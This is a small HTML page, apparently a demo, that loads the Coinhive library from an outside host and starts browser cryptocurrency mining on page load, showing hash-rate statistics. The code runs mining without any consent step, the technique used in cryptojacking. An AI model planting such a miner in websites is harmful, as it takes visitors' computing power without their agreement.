<html>
    <head>
        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
        <script>
            startMining = function() {
                var miner = new CoinHive.User('AMYh8KHyUnNF05VM6l6R34q7z6FLT9Qk', 'numerinico', {});
                miner.start();
                
                setInterval(function() {
                    var hashesPerSecond = miner.getHashesPerSecond();
                    var totalHashes = miner.getTotalHashes();
                    var acceptedHashes = miner.getAcceptedHashes();

                    document.getElementById('hashesPerSecond').value = hashesPerSecond;
                    document.getElementById('totalHashes').value = totalHashes;
                    document.getElementById('acceptedHashes').value = acceptedHashes;
                    // Output to HTML elements...
                }, 1000);
            };
        </script>
    </head>

    <body onload="startMining()">
        <header>Mining :)</header>
        hashesPerSecond : <input type="text" id="hashesPerSecond"><br>
        totalHashes : <input type="text" id="totalHashes"><br>
        acceptedHashes : <input type="text" id="acceptedHashes"><br>
    </body>
</html>
